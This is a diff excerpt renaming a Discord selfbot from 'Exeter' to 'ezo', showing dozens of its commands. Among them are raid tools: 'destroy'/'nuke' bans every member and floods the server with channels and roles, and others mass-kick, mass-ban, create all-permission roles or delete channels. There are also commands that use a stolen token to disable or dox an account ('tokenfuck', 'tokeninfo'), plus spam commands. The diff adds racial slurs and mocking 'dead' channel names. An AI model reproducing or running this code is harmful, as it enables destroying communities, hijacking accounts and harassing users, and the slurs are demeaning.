     endpoint = "https://api.alexflipnote.dev/filter/snow?image="
@@ -1505,7 +1489,7 @@ async def snow(ctx, user: discord.Member = None):
             await ctx.send(endpoint)
 
 
-@Exeter.command(aliases=["jpeg"])
+@ezo.command(aliases=["jpeg"])
 async def jpegify(ctx, user: discord.Member = None):
     await ctx.message.delete()
     endpoint = "https://api.alexflipnote.dev/filter/jpegify?image="
@@ -1533,7 +1517,7 @@ async def jpegify(ctx, user: discord.Member = None):
             await ctx.send(endpoint)
 
 
-@Exeter.command(aliases=["pornhublogo", "phlogo"])
+@ezo.command(aliases=["pornhublogo", "phlogo"])
 async def pornhub(ctx, word1=None, word2=None):
     await ctx.message.delete()
     if word1 is None or word2 is None:
@@ -1551,7 +1535,7 @@ async def pornhub(ctx, word1=None, word2=None):
         await ctx.send(endpoint)
 
 
-@Exeter.command(aliases=["pornhubcomment", 'phc'])
+@ezo.command(aliases=["pornhubcomment", 'phc'])
 async def phcomment(ctx, user: str = None, *, args=None):
     await ctx.message.delete()
     if user is None or args is None:
@@ -1571,7 +1555,7 @@ async def phcomment(ctx, user: str = None, *, args=None):
         await ctx.send(res["message"])
 
 
-@Exeter.command()
+@ezo.command()
 async def token(ctx, user: discord.Member = None):
     await ctx.message.delete()
     list = ["A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U",
@@ -1587,7 +1571,7 @@ async def token(ctx, user: discord.Member = None):
         await ctx.send(user.mention + "'s token is " + "".join(token))
 
 
-@Exeter.command()
+@ezo.command()
 async def hack(ctx, user: discord.Member = None):
     await ctx.message.delete()
     gender = ["Male", "Female", "Trans", "Other", "Retard"]
@@ -1680,7 +1664,7 @@ async def hack(ctx, user: discord.Member = None):
             content=f"```Successfully hacked {user}\nName: {random.choice(name)}\nGender: {random.choice(gender)}\nAge: {age}\nHeight: {random.choice(height)}\nWeight: {weight}\nHair Color: {random.choice(hair_color)}\nSkin Color: {random.choice(skin_color)}\nDOB: {dob}\nLocation: {random.choice(location)}\nPhone: {phone}\nE-Mail: {user.name + random.choice(email)}\nPasswords: {random.choices(password, k=3)}\nOccupation: {random.choice(occupation)}\nAnnual Salary: {random.choice(salary)}\nEthnicity: {random.choice(ethnicity)}\nReligion: {random.choice(religion)}\nSexuality: {random.choice(sexuality)}\nEducation: {random.choice(education)}```")
 
 
-@Exeter.command(aliases=["reversesearch", "anticatfish", "catfish"])
+@ezo.command(aliases=["reversesearch", "anticatfish", "catfish"])
 async def revav(ctx, user: discord.Member = None):
     await ctx.message.delete()
     if user is None:
@@ -1692,7 +1676,7 @@ async def revav(ctx, user: discord.Member = None):
         print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}" + Fore.RESET)
 
 
-@Exeter.command(aliases=['pfp', 'avatar'])
+@ezo.command(aliases=['pfp', 'avatar'])
 async def av(ctx, *, user: discord.Member = None):
     await ctx.message.delete()
     format = "gif"
@@ -1707,7 +1691,7 @@ async def av(ctx, *, user: discord.Member = None):
         await ctx.send(file=discord.File(file, f"Avatar.{format}"))
 
 
-@Exeter.command()
+@ezo.command()
 async def whois(ctx, *, user: discord.Member = None):
     await ctx.message.delete()
     if user is None:
@@ -1738,13 +1722,13 @@ async def whois(ctx, *, user: discord.Member = None):
         return await ctx.send(embed=em)
 
 
-@Exeter.command(aliases=["del", "quickdel"])
+@ezo.command(aliases=["del", "quickdel"])
 async def quickdelete(ctx, *, args):
     await ctx.message.delete()
     await ctx.send(args, delete_after=1)
 
 
-@Exeter.command()
+@ezo.command()
 async def minesweeper(ctx, size: int = 5):
     await ctx.message.delete()
     size = max(min(size, 8), 2)
@@ -1769,7 +1753,7 @@ async def minesweeper(ctx, size: int = 5):
     await ctx.send(message)
 
 
-@Exeter.command(name='1337speak', aliases=['leetspeak'])
+@ezo.command(name='1337speak', aliases=['leetspeak'])
 async def _1337_speak(ctx, *, text):
     await ctx.message.delete()
     text = text.replace('a', '4').replace('A', '4').replace('e', '3') \
@@ -1778,7 +1762,7 @@ async def _1337_speak(ctx, *, text):
     await ctx.send(f'{text}')
 
 
-@Exeter.command()
+@ezo.command()
 async def ghost(ctx):
     await ctx.message.delete()
     if config.get('password') == 'password-here':
@@ -1787,12 +1771,12 @@ async def ghost(ctx):
         password = config.get('password')
         with open('Images/Avatars/Transparent.png', 'rb') as f:
             try:
-                await Exeter.user.edit(password=password, username="ٴٴٴٴ", avatar=f.read())
+                await ezo.user.edit(password=password, username="ٴٴٴٴ", avatar=f.read())
             except discord.HTTPException as e:
                 print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}" + Fore.RESET)
 
 
-@Exeter.command(aliases=['pfpget', 'stealpfp'])
+@ezo.command(aliases=['pfpget', 'stealpfp'])
 async def pfpsteal(ctx, user: discord.Member):
     await ctx.message.delete()
     if config.get('password') == 'password-here':
@@ -1808,12 +1792,12 @@ async def pfpsteal(ctx, user: discord.Member):
         try:
             Image.open('Images/Avatars/Stolen/Stolen.png').convert('RGB')
             with open('Images/Avatars/Stolen/Stolen.png', 'rb') as f:
-                await Exeter.user.edit(password=password, avatar=f.read())
+                await ezo.user.edit(password=password, avatar=f.read())
         except discord.HTTPException as e:
             print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}" + Fore.RESET)
 
 
-@Exeter.command(name='set-pfp', aliases=['setpfp', 'pfpset,"changepfp'])
+@ezo.command(name='set-pfp', aliases=['setpfp', 'pfpset,"changepfp'])
 async def _set_pfp(ctx, *, url):
     await ctx.message.delete()
     if config.get('password') == 'password-here':
@@ -1829,12 +1813,12 @@ async def _set_pfp(ctx, *, url):
     try:
         Image.open('Images/Avatars/PFP-1.png').convert('RGB')
         with open('Images/Avatars/PFP-1.png', 'rb') as f:
-            await Exeter.user.edit(password=password, avatar=f.read())
+            await ezo.user.edit(password=password, avatar=f.read())
     except discord.HTTPException as e:
         print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}" + Fore.RESET)
 
 
-@Exeter.command(aliases=['wouldyourather', 'would-you-rather', 'wyrq'])
+@ezo.command(aliases=['wouldyourather', 'would-you-rather', 'wyrq'])
 async def wyr(ctx):  # b'\xfc'
     await ctx.message.delete()
     r = requests.get('https://www.conversationstarters.com/wyrqlist.php').text
@@ -1846,7 +1830,7 @@ async def wyr(ctx):  # b'\xfc'
     await message.add_reaction("🅱")
 
 
-@Exeter.command()
+@ezo.command()
 async def topic(ctx):  # b'\xfc'
     await ctx.message.delete()
     r = requests.get('https://www.conversationstarters.com/generator.php').content
@@ -1855,7 +1839,7 @@ async def topic(ctx):  # b'\xfc'
     await ctx.send(topic)
 
 
-@Exeter.command(aliases=['dong', 'penis'])
+@ezo.command(aliases=['dong', 'penis'])
 async def dick(ctx, *, user: discord.Member = None):
     await ctx.message.delete()
     if user is None:
@@ -1867,7 +1851,7 @@ async def dick(ctx, *, user: discord.Member = None):
     await ctx.send(f"{user}'s Dick size\n8{dong}D")
 
 
-@Exeter.command(aliases=['changehypesquad'])
+@ezo.command(aliases=['changehypesquad'])
 async def hypesquad(ctx, house):
     await ctx.message.delete()
     request = requests.Session()
@@ -1891,7 +1875,7 @@ async def hypesquad(ctx, house):
         print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}" + Fore.RESET)
 
 
-@Exeter.command(aliases=['tokenfucker', 'disable', 'crash'])
+@ezo.command(aliases=['tokenfucker', 'disable', 'crash'])
 async def tokenfuck(ctx, _token):
     await ctx.message.delete()
     headers = {
@@ -1918,7 +1902,7 @@ async def tokenfuck(ctx, _token):
     guild = {
         'channels': None,
         'icon': None,
-        'name': "Exeter",
+        'name': "ezo",
         'region': "europe"
     }
     for _i in range(50):
@@ -1948,7 +1932,7 @@ async def tokenfuck(ctx, _token):
                 break
 
 
-@Exeter.command(aliases=['fakeconnection', 'spoofconnection', 'spoofcon', "fakecon"])
+@ezo.command(aliases=['fakeconnection', 'spoofconnection', 'spoofcon', "fakecon"])
 async def fakenet(ctx, _type=None, *, name=None):
     await ctx.message.delete()
     if _type is None or name is None:
@@ -1980,10 +1964,10 @@ async def fakenet(ctx, _type=None, *, name=None):
         await ctx.send(f"Invalid connection_type: `{type}` with Username: `{name}` and ID: `{ID}`", delete_after=3)
     else:
         await ctx.send(
-            '**[ERROR]** `Exeter Fake-Connection doesn\'t work anymore because Discord patched connection-spoofing`')
+            '**[ERROR]** `ezo Fake-Connection doesn\'t work anymore because Discord patched connection-spoofing`')
 
 
-@Exeter.command(aliases=['tokinfo', 'tdox'])
+@ezo.command(aliases=['tokinfo', 'tdox'])
 async def tokeninfo(ctx, _token):
     await ctx.message.delete()
     headers = {
@@ -2051,12 +2035,12 @@ async def tokeninfo(ctx, _token):
     return await ctx.send(embed=em)
 
 
-@Exeter.command(aliases=["copyguild", "copyserver"])
+@ezo.command(aliases=["copyguild", "copyserver"])
 async def copy(ctx):  # b'\xfc'
     await ctx.message.delete()
-    await Exeter.create_guild(f'backup-{ctx.guild.name}')
+    await ezo.create_guild(f'backup-{ctx.guild.name}')
     await asyncio.sleep(4)
-    for g in Exeter.guilds:
+    for g in ezo.guilds:
         if f'backup-{ctx.guild.name}' in g.name:
             for c in g.channels:
                 await c.delete()
@@ -2073,7 +2057,7 @@ async def copy(ctx):  # b'\xfc'
         pass
 
 
-@Exeter.command()
+@ezo.command()
 async def poll(ctx, *, arguments):
     await ctx.message.delete()
     message = discord.utils.escape_markdown(arguments[str.find(arguments, "msg:"):str.find(arguments, "1:")]).replace(
@@ -2086,7 +2070,7 @@ async def poll(ctx, *, arguments):
     await message.add_reaction('🅱')
 
 
-@Exeter.command()
+@ezo.command()
 async def massmention(ctx, *, message=None):
     await ctx.message.delete()
     if len(list(ctx.guild.members)) >= 50:
@@ -2117,7 +2101,7 @@ async def massmention(ctx, *, message=None):
             await ctx.send(post_message)
 
 
-@Exeter.command(aliases=["rekt", "nuke"])
+@ezo.command(aliases=["rekt", "nuke"])
 async def destroy(ctx):
     await ctx.message.delete()
     for user in list(ctx.guild.members):
@@ -2138,31 +2122,31 @@ async def destroy(ctx):
     try:
         await ctx.guild.edit(
             name=RandString(),
-            description="Exeter LOL",
-            reason="Exeter LOL",
+            description="EZO IS ZADDY",
+            reason="Ezo Was Here <3",
             icon=None,
             banner=None
         )
     except:
         pass
     for _i in range(250):
-        await ctx.guild.create_text_channel(name="exeter")
+        await ctx.guild.create_text_channel(name="51 Dead Discordians")
     for _i in range(250):
-        await ctx.guild.create_role(name="exeter", color=RandomColor())
+        await ctx.guild.create_role(name="EZO W LOL", color=RandomColor())
 
 
-@Exeter.command(aliases=["banwave", "banall", "etb"])
+@ezo.command(aliases=["banwave", "banall", "etb"])
 async def massban(ctx):
     await ctx.message.delete()
     users = list(ctx.guild.members)
     for user in users:
         try:
-            await user.ban(reason="exeter")
+            await user.ban(reason="ezo said fuck you")
         except:
             pass
 
 
-@Exeter.command()
+@ezo.command()
 async def dynoban(ctx):
     await ctx.message.delete()
     for member in list(ctx.guild.members):
@@ -2171,23 +2155,23 @@ async def dynoban(ctx):
         await asyncio.sleep(1.5)
 
 
-@Exeter.command(aliases=["kickall", "kickwave"])
+@ezo.command(aliases=["kickall", "kickwave"])
 async def masskick(ctx):
     await ctx.message.delete()
     users = list(ctx.guild.members)
     for user in users:
         try:
-            await user.kick(reason="exeter")
+            await user.kick(reason="EZO W LOL")
         except:
             pass
 
 
-@Exeter.command(aliases=["spamroles", "massroles", "addroles"])
+@ezo.command(aliases=["spamroles", "massroles", "addroles"])
 async def massrole(ctx):
     await ctx.message.delete()
     for _i in range(250):
         try:
-            await ctx.guild.create_role(name="exeter", color=RandomColor(), permissions=Permissions.all())
+            await ctx.guild.create_role(name="ezo lol", color=RandomColor(), permissions=Permissions.all())
         except:
             try:
                 await ctx.guild.create_role(name="exeter", color=RandomColor())
@@ -2195,7 +2179,7 @@ async def massrole(ctx):
                 return
 
 
-@Exeter.command(aliases=["givemeadmin", "giveadminrole", "giveadminroles"])
+@ezo.command(aliases=["givemeadmin", "giveadminrole", "giveadminroles"])
 async def giveadmin(ctx):
     await ctx.message.delete()
     for role in ctx.guild.roles:
@@ -2206,17 +2190,17 @@ async def giveadmin(ctx):
             pass
 
 
-@Exeter.command(aliases=["masschannels", "masschannel", "ctc"])
+@ezo.command(aliases=["masschannels", "masschannel", "ctc"])
 async def spamchannels(ctx):
     await ctx.message.delete()
     for _i in range(250):
         try:
-            await ctx.guild.create_text_channel(name="exeter")
+            await ctx.guild.create_text_channel(name="51 Dead Robloxians")
         except:
             return
 
 
-@Exeter.command(aliases=["delchannel"])
+@ezo.command(aliases=["delchannel"])
 async def delchannels(ctx):
     await ctx.message.delete()
     for channel in list(ctx.guild.channels):
@@ -2226,7 +2210,7 @@ async def delchannels(ctx):
             return
 
 
-@Exeter.command(aliases=["deleteroles"])
+@ezo.command(aliases=["deleteroles"])
 async def delroles(ctx):
     await ctx.message.delete()
     for role in list(ctx.guild.roles):
@@ -2236,7 +2220,7 @@ async def delroles(ctx):
             pass
 
 
-@Exeter.command(aliases=["purgebans", "unbanall"])
+@ezo.command(aliases=["purgebans", "unbanall"])
 async def massunban(ctx):
     await ctx.message.delete()
     banlist = await ctx.guild.bans()
@@ -2248,18 +2232,18 @@ async def massunban(ctx):
             pass
 
 
-@Exeter.command()
+@ezo.command()
 async def spam(ctx, amount: int, *, message):
     await ctx.message.delete()
     for _i in range(amount):
         await ctx.send(message)
 
 
-@Exeter.command()
+@ezo.command()
 async def dm(ctx, user: discord.Member, *, message):
     await ctx.message.delete()
-    user = Exeter.get_user(user.id)
-    if ctx.author.id == Exeter.user.id:
+    user = ezo.get_user(user.id)
+    if ctx.author.id == ezo.user.id:
         return
     else:
         try:
@@ -2268,7 +2252,7 @@ async def dm(ctx, user: discord.Member, *, message):
             pass
 
 
-@Exeter.command(name='get-color', aliases=['color', 'colour', 'sc', "hexcolor", "rgb"])
+@ezo.command(name='get-color', aliases=['color', 'colour', 'sc', "hexcolor", "rgb"])
 async def _get_color(ctx, *, color: discord.Colour):
     await ctx.message.delete()
     file = io.BytesIO()
@@ -2279,7 +2263,7 @@ async def _get_color(ctx, *, color: discord.Colour):
     await ctx.send(file=discord.File(file, 'color.png'), embed=em)
 
 
-@Exeter.command(aliases=['rainbowrole'])
+@ezo.command(aliases=['rainbowrole'])
 async def rainbow(ctx, *, role):
     await ctx.message.delete()
     role = discord.utils.get(ctx.guild.roles, name=role)
@@ -2291,7 +2275,7 @@ async def rainbow(ctx, *, role):
             break
 
 
-@Exeter.command()
+@ezo.command()
 async def ping(ctx):
     await ctx.message.delete()
     before = time.monotonic()
@@ -2300,7 +2284,7 @@ async def ping(ctx):
     await message.edit(content=f"`{int(ping)} ms`")
 
 
-@Exeter.command(aliases=["guildinfo"])
+@ezo.command(aliases=["guildinfo"])
 async def serverinfo(ctx):
     await ctx.message.delete()
     date_format = "%a, %d %b %Y %I:%M %p"
@@ -2315,7 +2299,7 @@ async def serverinfo(ctx):
     await ctx.send(embed=embed)
 
 
-@Exeter.command()
+@ezo.command()
 async def wizz(ctx):
     await ctx.message.delete()
     if isinstance(ctx.message.channel, discord.TextChannel):
@@ -2382,15 +2366,15 @@ async def wizz(ctx):
             content=f"`Wizzing {ctx.message.channel.name}, will take {initial} seconds to complete`\n`Saving {random.randrange(0, 1000)} Messages...\nCaching {random.randrange(0, 1000)} Messages...\nDeleting {random.randrange(0, 1000)} Pinned Messages...\nKicking {len(ctx.message.channel.recipients)} Users...`")
 
 
-@Exeter.command(name='8ball')
+@ezo.command(name='8ball')
 async def _ball(ctx, *, question):
     await ctx.message.delete()
     responses = [
-        'That is a resounding no',
-        'It is not looking likely',
-        'Too hard to tell',
-        'It is quite possible',
-        'That is a definite yes!',
+        'Hell Nawl Nigga',
+        'Yh Most Likely',
+        'Ion Kno Jit Too Hard To Tell',
+        'It is quite possible jit',
+        'Hell Yh Nigga!',
         'Maybe',
         'There is a good chance'
     ]
@@ -2402,7 +2386,7 @@ async def _ball(ctx, *, question):
     await ctx.send(embed=embed)
 
 
-@Exeter.command(aliases=['slots', 'bet', "slotmachine"])
+@ezo.command(aliases=['slots', 'bet', "slotmachine"])
 async def slot(ctx):
     await ctx.message.delete()
     emojis = "🍎🍊🍐🍋🍉🍇🍓🍒"
@@ -2421,14 +2405,14 @@ async def slot(ctx):
             {"title": "Slot machine", "description": f"{slotmachine} No match, you lost"}))
 
 
-@Exeter.command()
+@ezo.command()
 async def tts(ctx, *, message):
     await ctx.message.delete()
     buff = await do_tts(message)
     await ctx.send(file=discord.File(buff, f"{message}.wav"))
 
 
-@Exeter.command(aliases=['guildpfp', 'serverpfp', 'servericon'])
+@ezo.command(aliases=['guildpfp', 'serverpfp', 'servericon'])
 async def guildicon(ctx):
     await ctx.message.delete()
     em = discord.Embed(title=ctx.guild.name)
@@ -2436,7 +2420,7 @@ async def guildicon(ctx):
     await ctx.send(embed=em)
 
 
-@Exeter.command(aliases=['serverbanner'])
+@ezo.command(aliases=['serverbanner'])
 async def banner(ctx):
     await ctx.message.delete()
     em = discord.Embed(title=ctx.guild.name)
@@ -2444,7 +2428,7 @@ async def banner(ctx):
     await ctx.send(embed=em)
 
 
-@Exeter.command(name='first-message', aliases=['firstmsg', 'fm', 'firstmessage'])
+@ezo.command(name='first-message', aliases=['firstmsg', 'fm', 'firstmessage'])
 async def _first_message(ctx, channel: discord.TextChannel = None):
     await ctx.message.delete()
     if channel is None:
@@ -2455,14 +2439,14 @@ async def _first_message(ctx, channel: discord.TextChannel = None):
     await ctx.send(embed=embed)
 
 
-@Exeter.command(aliases=["rc"])
+@ezo.command(aliases=["rc"])
 async def renamechannels(ctx, *, name):
     await ctx.message.delete()
     for channel in ctx.guild.channels:
         await channel.edit(name=name)
 
 
-@Exeter.command(aliases=["roles"])
+@ezo.command(aliases=["roles"])
 async def getroles(ctx):
     await ctx.message.delete()
     roles = list(ctx.guild.roles)
@@ -2477,7 +2461,7 @@ async def getroles(ctx):
     await ctx.send(roleStr)
 
 
-@Exeter.command()
+@ezo.command()
 async def test(ctx):
     await ctx.message.delete()
     users = list(ctx.guild.members)
@@ -2490,7 +2474,7 @@ async def test(ctx):
     await ctx.send(str(len(users)) + " users in cache")
 
 
-@Exeter.command()
+@ezo.command()
 async def testetb(ctx):
     await ctx.message.delete()
     users = list(ctx.guild.members)
@@ -2502,19 +2486,19 @@ async def testetb(ctx):
             pass
 
 
-@Exeter.command(aliases=["xavier"])
+@ezo.command(aliases=["xavier"])
 async def invite(ctx):
     await ctx.message.delete()
     await ctx.send('https://discord.com/oauth2/authorize?scope=bot&client_id=705544735540117526&permissions=8')
 
 
-@Exeter.command(aliases=["renameserver", "nameserver"])
+@ezo.command(aliases=["renameserver", "nameserver"])
 async def servername(ctx, *, name):
     await ctx.message.delete()
     await ctx.guild.edit(name=name)
 
 
-@Exeter.command()
+@ezo.command()
 async def nickall(ctx, nickname):
     await ctx.message.delete()
     for user in list(ctx.guild.members):
@@ -2524,7 +2508,7 @@ async def nickall(ctx, nickname):
             pass
 
 
-@Exeter.command()
+@ezo.command()
 async def youtube(ctx, *, search):
     await ctx.message.delete()
     query_string = parse.urlencode({'search_query': search})
@@ -2533,13 +2517,13 @@ async def youtube(ctx, *, search):
     await ctx.send('https://www.youtube.com/watch?v=' + search_results[0])
 
 
-@Exeter.command()
+@ezo.command()
 async def prefix(ctx, prefix):
     await ctx.message.delete()
-    Exeter.command_prefix = str(prefix)
+    ezo.command_prefix = str(prefix)
 
 
-@Exeter.command()
+@ezo.command()
 async def abc(ctx):
     await ctx.message.delete()
     ABC = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'ñ', 'o', 'p', 'q', 'r', 's', 't', 'u',
@@ -2551,7 +2535,7 @@ async def abc(ctx):
         await asyncio.sleep(2)
 
 
-@Exeter.command(aliases=["100"])
+@ezo.command(aliases=["100"])
 async def _100(ctx):
     await ctx.message.delete()
     message = ctx.send("Starting count to 100")
@@ -2561,7 +2545,7 @@ async def _100(ctx):
         await asyncio.sleep(2)
 
 
-@Exeter.command(aliases=['bitcoin'])
+@ezo.command(aliases=['bitcoin'])
 async def btc(ctx):
     await ctx.message.delete()
     r = requests.get('https://min-api.cryptocompare.com/data/price?fsym=BTC&tsyms=USD,EUR')
@@ -2573,14 +2557,14 @@ async def btc(ctx):
     await ctx.send(embed=em)
 
 
-@Exeter.command()
+@ezo.command()
 async def hastebin(ctx, *, message):
     await ctx.message.delete()
     r = requests.post("https://hastebin.com/documents", data=message).json()
     await ctx.send(f"<https://hastebin.com/{r['key']}>")
 
 
-@Exeter.command(aliases=["fancy"])
+@ezo.command(aliases=["fancy"])
 async def ascii(ctx, *, text):
     await ctx.message.delete()
     r = requests.get(f'http://artii.herokuapp.com/make?text={urllib.parse.quote_plus(text)}').text
@@ -2589,7 +2573,7 @@ async def ascii(ctx, *, text):
     await ctx.send(f"```{r}```")
 
 
-@Exeter.command(pass_context=True, aliases=["cyclename", "autoname", "autonick", "cycle"])
+@ezo.command(pass_context=True, aliases=["cyclename", "autoname", "autonick", "cycle"])
 async def cyclenick(ctx, *, text):
     await ctx.message.delete()
     global cycling
@@ -2601,48 +2585,48 @@ async def cyclenick(ctx, *, text):
             await ctx.message.author.edit(nick=name)
 
 
-@Exeter.command(aliases=["stopcyclename", "cyclestop", "stopautoname", "stopautonick", "stopcycle"])
+@ezo.command(aliases=["stopcyclename", "cyclestop", "stopautoname", "stopautonick", "stopcycle"])
 async def stopcyclenick(ctx):
     await ctx.message.delete()
     global cycling
     cycling = False
 
 
-@Exeter.command()
+@ezo.command()
 async def acceptfriends(ctx):
     await ctx.message.delete()
-    for relationship in Exeter.user.relationships:
+    for relationship in ezo.user.relationships:
         if relationship == discord.RelationshipType.incoming_request:
             await relationship.accept()
 
 
-@Exeter.command()
+@ezo.command()
 async def ignorefriends(ctx):
     await ctx.message.delete()
-    for relationship in Exeter.user.relationships:
+    for relationship in ezo.user.relationships:
         if relationship is discord.RelationshipType.incoming_request:
             relationship.delete()
 
 
-@Exeter.command()
+@ezo.command()
 async def delfriends(ctx):
     await ctx.message.delete()
-    for relationship in Exeter.user.relationships:
+    for relationship in ezo.user.relationships:
         if relationship is discord.RelationshipType.friend:
             await relationship.delete()
 
 
-@Exeter.command()
+@ezo.command()
 async def clearblocked(ctx):
     await ctx.message.delete()
-    print(Exeter.user.relationships)
-    for relationship in Exeter.user.relationships:
+    print(ezo.user.relationships)
+    for relationship in ezo.user.relationships:
         if relationship is discord.RelationshipType.blocked:
             print(relationship)
             await relationship.delete()
 
 
-@Exeter.command(aliases=["changeregions", "changeregion", "regionschange"])
+@ezo.command(aliases=["changeregions", "changeregion", "regionschange"])
 async def regionchange(ctx, amount: int):
     await ctx.message.delete()
     if isinstance(ctx.channel, discord.GroupChannel):
@@ -2668,7 +2652,7 @@ async def regionchange(ctx, amount: int):
             print(r)
 
 
-@Exeter.command()
+@ezo.command()
 async def kickgc(ctx):
     await ctx.message.delete()
     if isinstance(ctx.message.channel, discord.GroupChannel):
@@ -2676,14 +2660,14 @@ async def kickgc(ctx):
             await ctx.message.channel.remove_recipients(recipient)
 
 
-@Exeter.command(aliases=["gcleave"])
+@ezo.command(aliases=["gcleave"])
 async def leavegc(ctx):
     await ctx.message.delete()
     if isinstance(ctx.message.channel, discord.GroupChannel):
         await ctx.message.channel.leave()
 
 
-@Exeter.command()
+@ezo.command()
 async def massreact(ctx, emote):
     await ctx.message.delete()
     messages = await ctx.message.channel.history(limit=20).flatten()
@@ -2691,7 +2675,7 @@ async def massreact(ctx, emote):
         await message.add_reaction(emote)
 
 
-@Exeter.command()
+@ezo.command()
 async def dog(ctx):
     await ctx.message.delete()
     r = requests.get("https://dog.ceo/api/breeds/image/random").json()
@@ -2706,7 +2690,7 @@ async def dog(ctx):
         await ctx.send(link)
 
 
-@Exeter.command()
+@ezo.command()
 async def cat(ctx):
     await ctx.message.delete()
     r = requests.get("https://api.thecatapi.com/v1/images/search").json()
@@ -2721,7 +2705,7 @@ async def cat(ctx):
         await ctx.send(link)
 
 
-@Exeter.command()
+@ezo.command()
 async def sadcat(ctx):
     await ctx.message.delete()
     r = requests.get("https://api.alexflipnote.dev/sadcat").json()
@@ -2736,7 +2720,7 @@ async def sadcat(ctx):
         await ctx.send(link)
 
 
-@Exeter.command()
+@ezo.command()
 async def bird(ctx):
     await ctx.message.delete()
     r = requests.get("https://api.alexflipnote.dev/birb").json()
@@ -2751,7 +2735,7 @@ async def bird(ctx):
         await ctx.send(link)
 
 
-@Exeter.command()
+@ezo.command()
 async def fox(ctx):
     await ctx.message.delete()
     r = requests.get('https://randomfox.ca/floof/').json()
@@ -2766,7 +2750,7 @@ async def fox(ctx):
         await ctx.send(link)
 
 
-@Exeter.command()
+@ezo.command()
 async def anal(ctx):
     await ctx.message.delete()
     r = requests.get("https://nekos.life/api/v2/img/anal")
@@ -2783,7 +2767,7 @@ async def anal(ctx):
         await ctx.send(embed=em)
 
 
-@Exeter.command()
+@ezo.command()
 async def erofeet(ctx):
     await ctx.message.delete()
     r = requests.get("https://nekos.life/api/v2/img/erofeet")
@@ -2800,7 +2784,7 @@ async def erofeet(ctx):
         await ctx.send(embed=em)
 
 
-@Exeter.command()
+@ezo.command()
 async def feet(ctx):
     await ctx.message.delete()
     r = requests.get("https://nekos.life/api/v2/img/feetg")
@@ -2817,7 +2801,7 @@ async def feet(ctx):
         await ctx.send(embed=em)
 
 
-@Exeter.command()
+@ezo.command()
 async def hentai(ctx):
     await ctx.message.delete()
     r = requests.get("https://nekos.life/api/v2/img/Random_hentai_gif")
@@ -2834,7 +2818,7 @@ async def hentai(ctx):
         await ctx.send(embed=em)
 
 
-@Exeter.command()
+@ezo.command()
 async def boobs(ctx):
     await ctx.message.delete()
     r = requests.get("https://nekos.life/api/v2/img/boobs")
@@ -2851,7 +2835,7 @@ async def boobs(ctx):
         await ctx.send(embed=em)
 
 
-@Exeter.command()
+@ezo.command()
 async def tits(ctx):
     await ctx.message.delete()
     r = requests.get("https://nekos.life/api/v2/img/tits")
@@ -2868,7 +2852,7 @@ async def tits(ctx):
         await ctx.send(embed=em)
 
 
-@Exeter.command()
+@ezo.command()
 async def blowjob(ctx):
     await ctx.message.delete()
     r = requests.get("https://nekos.life/api/v2/img/blowjob")
@@ -2885,7 +2869,7 @@ async def blowjob(ctx):
         await ctx.send(embed=em)
 
 
-@Exeter.command(aliases=["neko"])
+@ezo.command(aliases=["neko"])
 async def lewdneko(ctx):
     await ctx.message.delete()
     r = requests.get("https://nekos.life/api/v2/img/nsfw_neko_gif")
@@ -2902,7 +2886,7 @@ async def lewdneko(ctx):
         await ctx.send(embed=em)
 
 
-@Exeter.command()
+@ezo.command()
 async def lesbian(ctx):
     await ctx.message.delete()
     r = requests.get("https://nekos.life/api/v2/img/les")
@@ -2919,7 +2903,7 @@ async def lesbian(ctx):
         await ctx.send(embed=em)
 
 
-@Exeter.command()
+@ezo.command()
 async def cumslut(ctx):
     await ctx.message.delete()
     r = requests.get("https://nekos.life/api/v2/img/cum")
@@ -2936,7 +2920,7 @@ async def cumslut(ctx):
         await ctx.send(embed=em)
 
 
-@Exeter.command(aliases=["vagina"])
+@ezo.command(aliases=["vagina"])
 async def pussy(ctx):
     await ctx.message.delete()
     r = requests.get("https://nekos.life/api/v2/img/pussy")
@@ -2953,7 +2937,7 @@ async def pussy(ctx):
         await ctx.send(embed=em)
 
 
-@Exeter.command()
+@ezo.command()
 async def waifu(ctx):
     await ctx.message.delete()
     r = requests.get("https://nekos.life/api/v2/img/waifu")
@@ -2970,7 +2954,7 @@ async def waifu(ctx):
         await ctx.send(embed=em)
 
 
-@Exeter.command()
+@ezo.command()
 async def feed(ctx, user: discord.Member):
     await ctx.message.delete()
     r = requests.get("https://nekos.life/api/v2/img/feed")
@@ -2987,7 +2971,7 @@ async def feed(ctx, user: discord.Member):
         await ctx.send(embed=em)
 
 
-@Exeter.command()
+@ezo.command()
 async def tickle(ctx, user: discord.Member):
     await ctx.message.delete()
     r = requests.get("https://nekos.life/api/v2/img/tickle")
@@ -3004,7 +2988,7 @@ async def tickle(ctx, user: discord.Member):
         await ctx.send(embed=em)
 
 
-@Exeter.command()
+@ezo.command()
 async def slap(ctx, user: discord.Member):
     await ctx.message.delete()
     r = requests.get("https://nekos.life/api/v2/img/slap")
@@ -3021,7 +3005,7 @@ async def slap(ctx, user: discord.Member):
         await ctx.send(embed=em)
 
 
-@Exeter.command()
+@ezo.command()
 async def hug(ctx, user: discord.Member):
     await ctx.message.delete()
     r = requests.get("https://nekos.life/api/v2/img/hug")
@@ -3038,7 +3022,7 @@ async def hug(ctx, user: discord.Member):
         await ctx.send(embed=em)
 
 
-@Exeter.command()
+@ezo.command()
 async def cuddle(ctx, user: discord.Member):
     await ctx.message.delete()
     r = requests.get("https://nekos.life/api/v2/img/cuddle")
@@ -3055,7 +3039,7 @@ async def cuddle(ctx, user: discord.Member):
         await ctx.send(embed=em)
 
 
-@Exeter.command()
+@ezo.command()
 async def smug(ctx, user: discord.Member):
     await ctx.message.delete()
     r = requests.get("https://nekos.life/api/v2/img/smug")
@@ -3072,7 +3056,7 @@ async def smug(ctx, user: discord.Member):
         await ctx.send(embed=em)
 
 
-@Exeter.command()
+@ezo.command()
 async def pat(ctx, user: discord.Member):
     await ctx.message.delete()
     r = requests.get("https://nekos.life/api/v2/img/pat")
@@ -3089,7 +3073,7 @@ async def pat(ctx, user: discord.Member):
         await ctx.send(embed=em)
 
 
-@Exeter.command()
+@ezo.command()
 async def kiss(ctx, user: discord.Member):
     await ctx.message.delete()
     r = requests.get("https://nekos.life/api/v2/img/kiss")
